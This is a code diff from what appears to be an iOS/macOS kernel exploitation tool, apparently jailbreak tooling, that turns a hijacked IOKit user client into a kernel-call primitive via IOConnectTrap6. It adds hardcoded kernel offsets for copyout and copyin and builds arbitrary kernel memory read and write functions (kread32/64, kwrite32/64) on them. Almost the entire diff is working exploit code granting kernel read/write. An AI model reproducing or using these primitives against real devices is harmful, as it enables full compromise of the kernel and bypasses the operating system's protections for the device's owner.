@@ -21,7 +21,8 @@ extern const mach_port_t kIOMasterPortDefault;
 uint32_t _user_client = 0;
 uint64_t _kslide = 0;
 
-uint64_t off_kread_gadget = 0xFFFFFFF005ABBF58;
+uint64_t off_copyout = 0xFFFFFFF00729CE6C;
+uint64_t off_copyin = 0xFFFFFFF00729CB98;
 
 uint32_t get_user_client() {
     io_service_t service = IOServiceGetMatchingService(
@@ -56,15 +57,47 @@ void save_uint32t_to_file(uint32_t value, const char *filePath) {
     printf("[+] saved 0x%x to %s\n", value, filePath);
 }
 
-uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
-//    return IOConnectTrap6(_user_client, 0, x0, x1, x2, x3, x4, addr);
-    return IOConnectTrap6(_user_client, (uint64_t)x0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), addr);
+uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4) {
+    uint64_t x6 = addr;  //BR X6
+//         x0 -> x1
+//         x1 -> x2
+//         x2 -> x3
+//         x3 -> x4
+//         x4 -> x5
+//         IOConnectTrap6(port, 0, x1, x2, x3, x4, x5, x6)
+    return IOConnectTrap6(_user_client, 0, x0, x1, x2, x3, x4, x6);
+}
+
+void kreadbuf(uint64_t addr, void *buf, size_t len)
+{
+    uint64_t copyout_addr = off_copyout + _kslide;
+    kcall(copyout_addr, addr, (uint64_t)buf, len, 0, 0);
+}
+
+void kwritebuf(uint64_t addr, void *buf, size_t len)
+{
+    uint64_t copyin_addr = off_copyin + _kslide;
+    kcall(copyin_addr, (uint64_t)buf, addr, len, 0, 0);
 }
 
 uint32_t kread32(uint64_t addr) {
-    uint64_t kread_gadget = 0x4141414141414141;//off_kread_gadget + _kslide;
-    
-    return (uint32_t)kcall(kread_gadget, addr, 0, 0, 0, 0, 0);
+    uint32_t val = 0;
+    kreadbuf(addr, &val, sizeof(val));
+    return val;
+}
+
+uint64_t kread64(uint64_t addr) {
+    uint64_t val = 0;
+    kreadbuf(addr, &val, sizeof(val));
+    return val;
+}
+
+void kwrite32(uint64_t addr, uint32_t val) {
+    kwritebuf(addr, &val, sizeof(val));
+}
+
+void kwrite64(uint64_t addr, uint64_t val) {
+    kwritebuf(addr, &val, sizeof(val));
 }
 
 int main(int argc, char **argv, char **envp){
@@ -74,7 +107,7 @@ int main(int argc, char **argv, char **envp){
     printf("kslide: 0x%llx\n", _kslide);
     
     remove("/tmp/test_kernrw_user_client.plist");
-    remove("/tmp/test_kernrw_handoff_done.plist");
+    remove("/tmp/test_kernrw_handoff_done.txt");
     
     uint32_t user_client = get_user_client();
     printf("[+] Got user client: 0x%x", _user_client);
